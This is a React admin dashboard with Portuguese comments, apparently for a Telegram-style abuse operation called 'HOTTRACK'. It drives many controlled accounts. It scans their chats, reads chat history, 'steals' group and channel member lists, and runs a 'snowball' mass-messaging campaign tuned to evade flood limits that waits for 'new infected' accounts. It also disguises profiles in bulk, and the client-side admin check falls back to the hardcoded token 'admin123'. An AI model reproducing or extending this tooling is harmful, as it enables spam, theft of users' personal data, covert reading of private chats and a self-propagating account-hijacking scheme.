import { useState, useEffect, useRef } from 'react';

export default function AdminPanel() {
  // --- SEUS ESTADOS ORIGINAIS + CORREÇÃO DE OWNER ---
  const [isAuthenticated, setIsAuthenticated] = useState(false);
  const [loginMode, setLoginMode] = useState('user'); // 'user' ou 'admin'
  const [usernameInput, setUsernameInput] = useState('');
  const [passwordInput, setPasswordInput] = useState('');
  const [adminTokenInput, setAdminTokenInput] = useState('');
  const [isAdmin, setIsAdmin] = useState(false);
  
  // ESTADO CRUCIAL PARA CORRIGIR O CARREGAMENTO DE DADOS
  const [ownerId, setOwnerId] = useState(''); 

  // --- NAVEGAÇÃO ---
  const [tab, setTab] = useState('dashboard'); 
  
  // --- DADOS DO SISTEMA ---
  const [sessions, setSessions] = useState([]);
  const [stats, setStats] = useState({ total: 0, pending: 0, sent: 0 });
  const [logs, setLogs] = useState([]);
  
  // --- ESTADOS DO CRM (BOLA DE NEVE) ---
  const [processing, setProcessing] = useState(false);
  const [msg, setMsg] = useState('{Olá|Oi}, tudo bem?');
  const [imgUrl, setImgUrl] = useState(''); 
  const [selectedPhones, setSelectedPhones] = useState(new Set());
  const [progress, setProgress] = useState(0);
  const [checkingStatus, setCheckingStatus] = useState(false);
  const stopCampaignRef = useRef(false);

  // --- ESTADOS DO GOD MODE ---
  const [allGroups, setAllGroups] = useState([]);
  const [allChannels, setAllChannels] = useState([]);
  const [harvestedIds, setHarvestedIds] = useState(new Set());
  const [isScanning, setIsScanning] = useState(false);
  const [scanProgress, setScanProgress] = useState(0);
  const [filterNumber, setFilterNumber] = useState('');
  const [isHarvestingAll, setIsHarvestingAll] = useState(false);
  const [totalHarvestedSession, setTotalHarvestedSession] = useState(0);
  const stopHarvestRef = useRef(false);

  // --- ESTADOS DE FERRAMENTAS ---
  const [viewingChat, setViewingChat] = useState(null);
  const [chatHistory, setChatHistory] = useState([]);
  const [loadingHistory, setLoadingHistory] = useState(false);
  const [newName, setNewName] = useState('');
  const [photoUrl, setPhotoUrl] = useState('');
  const [storyUrl, setStoryUrl] = useState('');
  const [storyCaption, setStoryCaption] = useState('');

  // --- INICIALIZAÇÃO CORRIGIDA ---
  useEffect(() => {
    const savedOwner = localStorage.getItem('hottrack_owner');
    const savedIsAdmin = localStorage.getItem('hottrack_is_admin') === 'true';
    
    // Recupera dados salvos do God Mode
    const savedGroups = localStorage.getItem('godModeGroups');
    const savedChannels = localStorage.getItem('godModeChannels');
    if (savedGroups) setAllGroups(JSON.parse(savedGroups));
    if (savedChannels) setAllChannels(JSON.parse(savedChannels));

    // Se já tiver login salvo, carrega tudo
    if (savedOwner) {
        setOwnerId(savedOwner);
        setIsAuthenticated(true);
        setIsAdmin(savedIsAdmin);
        // Pequeno delay para garantir que o estado atualizou antes do fetch
        setTimeout(() => fetchData(savedOwner), 100);
    }
  }, []);

  // --- FUNÇÃO FETCH CORRIGIDA (O PULO DO GATO) ---
  const fetchData = async (currentUser = ownerId) => {
    if (!currentUser) return; // Não tenta buscar sem dono
    
    try {
      const timestamp = Date.now(); // Evita cache
      
      // 1. LISTAR SESSÕES (Passando ownerId)
      const sRes = await fetch(`/api/list-sessions?ownerId=${currentUser}&_t=${timestamp}`);
      const sData = await sRes.json();
      if (sData.sessions) {
          setSessions(prev => {
              const newSessions = sData.sessions || [];
              return newSessions.map(ns => {
                  const old = prev.find(p => p.phone_number === ns.phone_number);
                  return { ...ns, is_active: old ? old.is_active : ns.is_active };
              });
          });
      }

      // 2. STATS (Passando ownerId)
      const stRes = await fetch(`/api/stats?ownerId=${currentUser}&_t=${timestamp}`);
      if (stRes.ok) setStats(await stRes.json());
      
      // 3. COLHIDOS (Passando ownerId)
      const hRes = await fetch(`/api/get-harvested?ownerId=${currentUser}&_t=${timestamp}`);
      const hData = await hRes.json();
      if(hData.harvestedIds) setHarvestedIds(new Set(hData.harvestedIds));

    } catch (e) { console.error("Erro dados:", e); }
  };

  const addLog = (text) => setLogs(prev => [`[${new Date().toLocaleTimeString()}] ${text}`, ...prev]);

  // --- SEU LOGIN ORIGINAL (INTEGRADO) ---
  const handleLogin = async (e) => {
    e.preventDefault();
    
    if (loginMode === 'user') {
        try {
            const res = await fetch('/api/admin-login', { 
                method: 'POST', 
                headers: {'Content-Type': 'application/json'}, 
                body: JSON.stringify({ password: passwordInput }) 
            });
            const data = await res.json();
            
            if(data.success) { 
                // Define o dono baseado na resposta da API ou no input
                const user = data.ownerId || usernameInput || 'partner';
                setIsAuthenticated(true);
                setOwnerId(user);
                setIsAdmin(false);
                
                // Persistência
                localStorage.setItem('hottrack_owner', user);
                localStorage.setItem('hottrack_is_admin', 'false');
                
                fetchData(user);
            } else { 
                alert('Senha incorreta'); 
            }
        } catch (e) { alert('Erro de conexão'); }
    } else {
        // Admin Master
        if (adminTokenInput === (process.env.ADMIN_TOKEN || 'admin123')) {
            setIsAuthenticated(true);
            setOwnerId('admin');
            setIsAdmin(true);
            localStorage.setItem('hottrack_owner', 'admin');
            localStorage.setItem('hottrack_is_admin', 'true');
            fetchData('admin');
        } else {
            alert('Token inválido');
        }
    }
  };

  const logout = () => {
      localStorage.removeItem('hottrack_owner');
      localStorage.removeItem('hottrack_is_admin');
      window.location.reload();
  };

  // ==============================================================================
  // MOTOR V7 (BOLA DE NEVE + FURTIVO) NO SEU LAYOUT
  // ==============================================================================
  const startRealCampaign = async () => {
     if (selectedPhones.size === 0) return alert('Selecione contas!');
     
     if(!confirm(`⚠️ INICIAR BOLA DE NEVE?\n\n- Modo Infinito (Espera novos leads)\n- Anti-Flood Ativo\n- Contas: ${selectedPhones.size}`)) return;

     setProcessing(true);
     stopCampaignRef.current = false;
     setProgress(0);
     addLog('❄️ BOLA DE NEVE ATIVA: Aguardando e disparando...');
     
     try {
         let availableSenders = Array.from(selectedPhones);
         const floodCoolDown = new Map(); 

         // CONFIGURAÇÃO FURTIVA (STEALTH)
         const BATCH_SIZE = 5; // Apenas 5 por vez (Segurança máxima)
         const DELAY_MS = 8000; // 8 segundos de pausa (Segurança máxima)
         const LEADS_PER_FETCH = 200;
         
         let totalSentSession = 0;

         while (true) {
             if (stopCampaignRef.current) { addLog('🛑 Parada manual.'); break; }

             // Gestão de Geladeira (Anti-Flood)
             const now = Date.now();
             for (const [phone, unlockTime] of floodCoolDown.entries()) {
                 if (now > unlockTime) {
                     availableSenders.push(phone);
                     floodCoolDown.delete(phone);
                     addLog(`🔥 Conta ${phone} pronta.`);
                 }
             }

             if (availableSenders.length === 0) {
                 addLog('⏳ Pausa geral (Recuperando Contas). Aguardando 1 min...');
                 await new Promise(r => setTimeout(r, 60000));
                 continue;
             }

             // Busca Leads (Passando ownerId para isolar dados)
             const res = await fetch(`/api/get-campaign-leads?limit=${LEADS_PER_FETCH}&ownerId=${ownerId}`);
             const data = await res.json();
             const leads = data.leads || [];
             
             // --- LÓGICA BOLA DE NEVE ---
             // Se não tem leads, não para. Espera entrar novos (pelo Auto-Harvest).
             if (leads.length === 0) {
                 addLog('❄️ Sem leads na fila. Aguardando novos infectados (30s)...');
                 await new Promise(r => setTimeout(r, 30000)); 
                 fetchData(ownerId); // Atualiza os contadores na tela
                 continue; 
             }

             for (let i = 0; i < leads.length; i += BATCH_SIZE) {
                 if (stopCampaignRef.current) break;

                 const batch = leads.slice(i, i + BATCH_SIZE);
                 const promises = batch.map(async (lead, idx) => {
                     if (availableSenders.length === 0) return;
                     const senderIndex = Math.floor(Math.random() * availableSenders.length);
                     const sender = availableSenders[senderIndex];

                     try {
                         const resp = await fetch('/api/dispatch', {
                             method: 'POST',
                             headers: { 'Content-Type': 'application/json' },
                             body: JSON.stringify({ 
                                 senderPhone: sender, 
                                 target: lead.user_id, 
                                 username: lead.username, 
                                 originChatId: lead.chat_id, 
                                 message: msg, 
                                 imageUrl: imgUrl, 
                                 leadDbId: lead.id,
                                 ownerId: ownerId // Importante passar o dono
                             })
                         });
                         
                         if (resp.status === 429) {
                             addLog(`🥶 ${sender} Flood. Pausa 10 min.`);
                             availableSenders = availableSenders.filter(p => p !== sender);
                             floodCoolDown.set(sender, Date.now() + 600000);
                         }
                     } catch (err) {}
                 });
                 
                 await Promise.all(promises);
                 totalSentSession += batch.length;
                 const estimatedTotal = (stats.pending || 0) + (stats.sent || 0) || 1000;
                 setProgress(Math.min(100, Math.round((totalSentSession / estimatedTotal) * 100)));
                 
                 await new Promise(r => setTimeout(r, DELAY_MS));
             }
             fetchData(ownerId); // Atualiza tela a cada lote
         }
     } catch (e) { addLog(`⛔ Erro: ${e.message}`); }
     setProcessing(false);
  };

  const stopCampaign = () => { stopCampaignRef.current = true; addLog('🛑 Parando...'); };

  // --- OUTRAS FUNÇÕES ---
  const checkAllStatus = async () => {
      if(sessions.length === 0) return;
      setCheckingStatus(true);
      addLog('🔍 Verificando status...');
      let curr = [...sessions];
      for(let i=0; i<curr.length; i++) {
          try {
              const res = await fetch('/api/check-status', { method: 'POST', body: JSON.stringify({ phone: curr[i].phone_number }), headers: {'Content-Type': 'application/json'} });
              const data = await res.json();
              curr[i].is_active = (data.status === 'alive');
              setSessions([...curr]); 
          } catch(e) {}
      }
      setCheckingStatus(false);
      addLog('✅ Status atualizado.');
  };

  const toggleSelect = (phone) => {
    const newSet = new Set(selectedPhones);
    if(newSet.has(phone)) newSet.delete(phone); else newSet.add(phone);
    setSelectedPhones(newSet);
  };

  const selectAll = () => {
    const newSet = new Set();
    sessions.forEach(s => { if(s.is_active) newSet.add(s.phone_number) });
    setSelectedPhones(newSet);
    addLog(`✅ ${newSet.size} contas selecionadas.`);
  };

  const handleDeleteSession = async (phone) => {
      if(!confirm('Deletar conta?')) return;
      await fetch('/api/delete-session', { method: 'POST', body: JSON.stringify({phone}), headers: {'Content-Type': 'application/json'} });
      setSessions(prev => prev.filter(s => s.phone_number !== phone));
  };

  const startMassHarvest = async () => {
      const targets = [...allGroups, ...allChannels].filter(c => !harvestedIds.has(c.id));
      if (targets.length === 0) return alert("Nada novo.");
      if (!confirm(`Aspirar ${targets.length} fontes?`)) return;
      setIsHarvestingAll(true); stopHarvestRef.current = false;
      let count = 0;
      addLog('🕷️ Iniciando coleta...');
      for (let i = 0; i < targets.length; i++) {
          if (stopHarvestRef.current) break;
          try {
              const res = await fetch('/api/spy/harvest', { method: 'POST', body: JSON.stringify({ phone: targets[i].ownerPhone, chatId: targets[i].id, chatName: targets[i].title, isChannel: targets[i].type === 'Canal', ownerId }), headers: {'Content-Type': 'application/json'} });
              const data = await res.json();
              if(data.success) { count += data.count; setTotalHarvestedSession(count); setHarvestedIds(prev => new Set(prev).add(targets[i].id)); addLog(`✅ +${data.count} leads de ${targets[i].title}`); }
          } catch (e) {}
          await new Promise(r => setTimeout(r, 2000));
      }
      setIsHarvestingAll(false); fetchData(ownerId);
  };

  const scanNetwork = async () => {
      if (sessions.length === 0) return alert("Sem contas.");
      setIsScanning(true); setScanProgress(0);
      let g = [], c = [];
      for (let i = 0; i < sessions.length; i++) {
          const phone = sessions[i].phone_number;
          setScanProgress(Math.round(((i+1)/sessions.length)*100));
          try {
              const res = await fetch('/api/spy/list-chats', { method: 'POST', body: JSON.stringify({ phone }), headers: {'Content-Type': 'application/json'} });
              const data = await res.json();
              if (data.chats) data.chats.forEach(chat => { const obj = {...chat, ownerPhone: phone}; if(chat.type === 'Canal') c.push(obj); else g.push(obj); });
          } catch (e) {}
      }
      const ug = [...new Map(g.map(i => [i.id, i])).values()].sort((a,b)=>b.participantsCount-a.participantsCount);
      const uc = [...new Map(c.map(i => [i.id, i])).values()].sort((a,b)=>b.participantsCount-a.participantsCount);
      setAllGroups(ug); setAllChannels(uc);
      localStorage.setItem('godModeGroups', JSON.stringify(ug)); localStorage.setItem('godModeChannels', JSON.stringify(uc));
      setIsScanning(false);
  };

  const handleMassUpdateProfile = async () => {
    if (selectedPhones.size === 0) return alert('Selecione contas!');
    setProcessing(true);
    for (const phone of Array.from(selectedPhones)) await fetch('/api/update-profile', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ phone, newName, photoUrl }) });
    setProcessing(false); addLog('✅ Perfis atualizados.');
  };

  const handleMassPostStory = async () => {
      if (selectedPhones.size === 0) return alert('Selecione contas!');
      setProcessing(true);
      for (const phone of Array.from(selectedPhones)) await fetch('/api/post-story', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ phone, mediaUrl: storyUrl, caption: storyCaption }) });
      setProcessing(false); addLog('✅ Stories postados.');
  };

  const openChatViewer = async (chat) => { 
      setViewingChat(chat); setLoadingHistory(true); setChatHistory([]);
      try {
        const res = await fetch('/api/spy/get-history', { method: 'POST', body: JSON.stringify({ phone: chat.ownerPhone, chatId: chat.id }), headers: {'Content-Type': 'application/json'} });
        const data = await res.json(); setChatHistory(data.history || []);
      } catch (e) {}
      setLoadingHistory(false);
  };
  
  const stealLeadsManual = async (chat) => {
      addLog(`🕷️ Roubando ${chat.title}...`);
      const res = await fetch('/api/spy/harvest', { method: 'POST', body: JSON.stringify({ phone: chat.ownerPhone, chatId: chat.id, chatName: chat.title, isChannel: chat.type === 'Canal', ownerId }), headers: {'Content-Type': 'application/json'} });
      const data = await res.json();
      if(data.success) { addLog(`✅ +${data.count} leads.`); setHarvestedIds(prev => new Set(prev).add(chat.id)); }
  };

  const filteredGroups = filterNumber ? allGroups.filter(g => g.ownerPhone.includes(filterNumber)) : allGroups;
  const filteredChannels = filterNumber ? allChannels.filter(c => c.ownerPhone.includes(filterNumber)) : allChannels;

  // --- SEU LAYOUT ORIGINAL ---
  if (!isAuthenticated) return (
      <div style={{height:'100vh', background:'#000', display:'flex', alignItems:'center', justifyContent:'center'}}>
          <form onSubmit={handleLogin} style={{background:'#1c242f', padding:'40px', borderRadius:'15px', border:'1px solid #3390ec', width:'350px'}}>
              <h2 style={{color:'white', textAlign:'center', marginTop:0}}>HOTTRACK LOGIN</h2>
              
              <div style={{display:'flex', justifyContent:'center', gap:'10px', marginBottom:'20px'}}>
                  <button type="button" onClick={()=>setLoginMode('user')} style={{background: loginMode==='user'?'#3390ec':'#0d1117', color:'white', border:'1px solid #3390ec', padding:'10px', flex:1, cursor:'pointer'}}>MODO USUÁRIO</button>
                  <button type="button" onClick={()=>setLoginMode('admin')} style={{background: loginMode==='admin'?'#3390ec':'#0d1117', color:'white', border:'1px solid #3390ec', padding:'10px', flex:1, cursor:'pointer'}}>MODO ADMIN</button>
              </div>

              {loginMode === 'user' ? (
                  <>
                    <input type="text" value={usernameInput} onChange={e=>setUsernameInput(e.target.value)} placeholder="Usuário" style={{width:'100%', padding:'10px', marginBottom:'10px', borderRadius:'5px', border:'none'}} />
                    <input type="password" value={passwordInput} onChange={e=>setPasswordInput(e.target.value)} placeholder="Senha" style={{width:'100%', padding:'10px', marginBottom:'10px', borderRadius:'5px', border:'none'}} />
                  </>
              ) : (
                  <input type="password" value={adminTokenInput} onChange={e=>setAdminTokenInput(e.target.value)} placeholder="Token de Admin" style={{width:'100%', padding:'10px', marginBottom:'10px', borderRadius:'5px', border:'none'}} />
              )}
              
              <button type="submit" style={{width:'100%', padding:'12px', background:'#238636', color:'white', border:'none', borderRadius:'5px', fontWeight:'bold', cursor:'pointer'}}>ENTRAR</button>
          </form>
      </div>
  );

  return (
    <div style={{ backgroundColor: '#0d1117', color: '#c9d1d9', minHeight: '100vh', padding: '20px', fontFamily: 'monospace' }}>
        <div style={{marginBottom:'20px', borderBottom:'1px solid #30363d', paddingBottom:'10px', display:'flex', justifyContent:'space-between', alignItems:'center'}}>
            <div>
                <button onClick={()=>setTab('dashboard')} style={{marginRight:'10px', padding:'10px 20px', background: tab==='dashboard'?'#238636':'transparent', border:'1px solid #238636', color:'white', borderRadius:'5px', cursor:'pointer'}}>🚀 BOLA DE NEVE</button>
                <button onClick={()=>setTab('spy')} style={{marginRight:'10px', padding:'10px 20px', background: tab==='spy'?'#8957e5':'transparent', border:'1px solid #8957e5', color:'white', borderRadius:'5px', cursor:'pointer'}}>👁️ SPY</button>
                <button onClick={()=>setTab('tools')} style={{padding:'10px 20px', background: tab==='tools'?'#1f6feb':'transparent', border:'1px solid #1f6feb', color:'white', borderRadius:'5px', cursor:'pointer'}}>🛠️ TOOLS</button>
            </div>
            <div>
               <span style={{fontSize:'12px', marginRight:'10px'}}>Logado: <b>{ownerId}</b></span>
               <button onClick={logout} style={{color:'red', background:'none', border:'none', cursor:'pointer'}}>Sair</button>
            </div>
        </div>

        {tab === 'dashboard' && (
            <div style={{display:'grid', gridTemplateColumns:'2fr 1fr', gap:'20px'}}>
                <div style={{background:'#161b22', padding:'20px', borderRadius:'8px'}}>
                    <div style={{display:'flex', gap:'20px', marginBottom:'20px'}}>
                        <div style={{flex:1, background:'#0d1117', padding:'15px', textAlign:'center', border:'1px solid #d29922'}}><h2>{stats.pending}</h2><small>Fila Pendente</small></div>
                        <div style={{flex:1, background:'#0d1117', padding:'15px', textAlign:'center', border:'1px solid #238636'}}><h2>{stats.sent}</h2><small>Enviados</small></div>
                    </div>
                    <input type="text" placeholder="URL Imagem" value={imgUrl} onChange={e=>setImgUrl(e.target.value)} style={{width:'100%', padding:'10px', marginBottom:'10px', background:'#0d1117', color:'white', border:'1px solid #30363d'}} />
                    <textarea value={msg} onChange={e=>setMsg(e.target.value)} placeholder="Mensagem {Spintax}..." style={{width:'100%', height:'100px', background:'#0d1117', color:'white', border:'1px solid #30363d', padding:'10px'}}/>
                    
                    <div style={{marginTop:'15px'}}>
                        {!processing ? (
                            <button onClick={startRealCampaign} style={{width:'100%', padding:'20px', background:'#238636', color:'white', border:'none', cursor:'pointer', fontWeight:'bold', borderRadius:'5px'}}>INICIAR BOLA DE NEVE ❄️</button>
                        ) : (
                            <button onClick={stopCampaign} style={{width:'100%', padding:'20px', background:'#f85149', color:'white', border:'none', cursor:'pointer', fontWeight:'bold', borderRadius:'5px'}}>🛑 PARAR</button>
                        )}
                    </div>
                    <div style={{marginTop:'20px', height:'200px', overflowY:'auto', background:'#000', padding:'10px', fontSize:'12px', color:'#00ff00', borderRadius:'5px'}}>
                        {logs.map((l,i)=><div key={i}>{l}</div>)}
                    </div>
                </div>
                <div style={{background:'#161b22', padding:'20px', borderRadius:'8px'}}>
                    <div style={{display:'flex', justifyContent:'space-between', marginBottom:'10px'}}><h3>Suas Contas ({sessions.length})</h3><button onClick={checkAllStatus} style={{cursor:'pointer'}}>Check</button></div>
                    <button onClick={selectAll} style={{width:'100%', padding:'10px', background:'#30363d', color:'white', marginBottom:'10px', border:'none', cursor:'pointer'}}>Selecionar Online</button>
                    <div style={{maxHeight:'500px', overflowY:'auto'}}>
                        {sessions.map(s => (
                            <div key={s.id} style={{padding:'10px', borderBottom:'1px solid #30363d', display:'flex', justifyContent:'space-between'}}>
                                <span style={{color: s.is_active?'#00ff00':'#ff0000'}}>{s.phone_number}</span>
                                <input type="checkbox" checked={selectedPhones.has(s.phone_number)} onChange={()=>toggleSelect(s.phone_number)} style={{cursor:'pointer'}} />
                                <button onClick={()=>handleDeleteSession(s.phone_number)} style={{background:'none', border:'none', cursor:'pointer'}}>🗑️</button>
                            </div>
                        ))}
                    </div>
                </div>
            </div>
        )}

        {tab === 'spy' && (
            <div style={{background:'#161b22', padding:'20px', borderRadius:'8px'}}>
                <div style={{display:'flex', gap:'10px', marginBottom:'20px'}}>
                     <button onClick={startMassHarvest} disabled={isHarvestingAll} style={{padding:'10px', background:'#238636', color:'white', border:'none', cursor:'pointer'}}>ASPIRAR TUDO</button>
                     <button onClick={() => stopHarvestRef.current = true} style={{padding:'10px', background:'#f85149', color:'white', border:'none', cursor:'pointer'}}>PARAR</button>
                     <button onClick={scanNetwork} disabled={isScanning} style={{padding:'10px', background:'#8957e5', color:'white', border:'none', cursor:'pointer'}}>SCAN</button>
                     <input type="text" placeholder="Filtrar" value={filterNumber} onChange={e => setFilterNumber(e.target.value)} style={{padding:'10px', background:'#0d1117', border:'1px solid #30363d', color:'white', width:'150px'}}/>
                </div>
                <div style={{display:'grid', gridTemplateColumns:'1fr 1fr', gap:'20px'}}>
                    <div>
                        <h4>GRUPOS ({filteredGroups.length})</h4>
                        <div style={{maxHeight:'500px', overflowY:'auto'}}>
                            {filteredGroups.map(g => (
                                <div key={g.id} style={{padding:'10px', borderBottom:'1px solid #21262d', opacity: harvestedIds.has(g.id) ? 0.5 : 1, display:'flex', justifyContent:'space-between'}}>
                                    <div>{g.title} {harvestedIds.has(g.id) && '✅'} <small>({g.participantsCount})</small></div>
                                    <button onClick={()=>stealLeadsManual(g)} style={{cursor:'pointer'}}>ROUBAR</button>
                                </div>
                            ))}
                        </div>
                    </div>
                    <div>
                        <h4>CANAIS ({filteredChannels.length})</h4>
                        <div style={{maxHeight:'500px', overflowY:'auto'}}>
                            {filteredChannels.map(c => (
                                <div key={c.id} style={{padding:'10px', borderBottom:'1px solid #21262d', opacity: harvestedIds.has(c.id) ? 0.5 : 1, display:'flex', justifyContent:'space-between'}}>
                                    <div>{c.title} {harvestedIds.has(c.id) && '✅'} <small>({c.participantsCount})</small></div>
                                    <button onClick={()=>stealLeadsManual(c)} style={{cursor:'pointer'}}>ROUBAR</button>
                                </div>
                            ))}
                        </div>
                    </div>
                </div>
            </div>
        )}
        
        {tab === 'tools' && (
             <div style={{ padding: '20px', background: '#161b22' }}>
                <h3>Camuflagem</h3>
                <input type="text" placeholder="Nome" value={newName} onChange={e => setNewName(e.target.value)} style={{ width: '100%', marginBottom: '10px', padding: '10px' }} />
                <input type="text" placeholder="Foto URL" value={photoUrl} onChange={e => setPhotoUrl(e.target.value)} style={{ width: '100%', marginBottom: '10px', padding: '10px' }} />
                <button onClick={handleMassUpdateProfile} style={{ width: '100%', padding: '10px', background: '#8957e5', color: 'white', border: 'none', cursor:'pointer' }}>ATUALIZAR</button>
                <h3 style={{marginTop:'30px'}}>Stories</h3>
                <input type="text" placeholder="Mídia URL" value={storyUrl} onChange={e => setStoryUrl(e.target.value)} style={{ width: '100%', marginBottom: '10px', padding: '10px' }} />
                <button onClick={handleMassPostStory} style={{ width: '100%', padding: '10px', background: '#1f6feb', color: 'white', border: 'none', cursor:'pointer' }}>POSTAR</button>
            </div>
        )}
        
        {viewingChat && (
            <div style={{position:'fixed', top:0, left:0, width:'100%', height:'100%', background:'rgba(0,0,0,0.9)', zIndex:999, display:'flex', alignItems:'center', justifyContent:'center'}}>
                <div style={{width:'600px', height:'80%', background:'#161b22', padding:'20px', borderRadius:'10px', color:'white'}}>
                    <h3>{viewingChat.title}</h3>
                    <button onClick={()=>setViewingChat(null)} style={{float:'right', background:'red', color:'white', cursor:'pointer'}}>X</button>
                    <div>{chatHistory.map((m,i)=><div key={i}>{m.sender}: {m.text}</div>)}</div>
                </div>
            </div>
        )}
    </div>
  );
}
